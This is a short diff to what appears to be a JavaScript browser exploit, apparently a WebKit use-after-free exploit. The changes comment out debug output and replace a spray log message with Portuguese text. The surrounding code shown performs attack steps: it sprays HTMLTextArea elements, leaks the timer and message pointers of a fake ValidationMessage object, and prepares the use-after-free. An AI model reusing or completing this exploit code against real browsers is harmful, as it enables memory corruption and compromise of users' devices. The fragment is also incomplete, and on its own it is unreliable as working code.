@@ -420,15 +420,15 @@ function reuseTargetObj() {
 }
 
 function dumpTargetObj() {
-	debug_log("[+] m_timer: " + g_timer_leak);
-	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
-	debug_log("[+] m_messageBody: " + g_message_body_leak);
+//	debug_log("[+] m_timer: " + g_timer_leak);
+//	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
+//	debug_log("[+] m_messageBody: " + g_message_body_leak);
 }
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
-			debug_log("[+] Found fake ValidationMessage");
+//			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
@@ -475,7 +475,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("[+] Spraying HTMLTextareaElement ...");
+	debug_log("Processo iniciado ...");
 
 	let textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
